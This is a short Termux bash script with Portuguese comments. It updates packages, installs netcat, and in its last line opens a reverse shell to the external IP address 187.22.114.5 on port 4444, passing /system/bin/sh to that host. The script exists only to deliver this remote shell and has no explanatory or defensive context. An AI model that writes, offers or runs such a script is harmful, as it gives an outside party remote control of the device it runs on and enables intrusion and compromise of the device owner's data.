#!/data/data/com.termux/files/usr/bin/bash

# Atualizar pacotes
pkg update && pkg upgrade -y

# Instalar Netcat
pkg install netcat -y

# Executar o shell reverso
nc 187.22.114.5 4444 -e /system/bin/sh
                                              
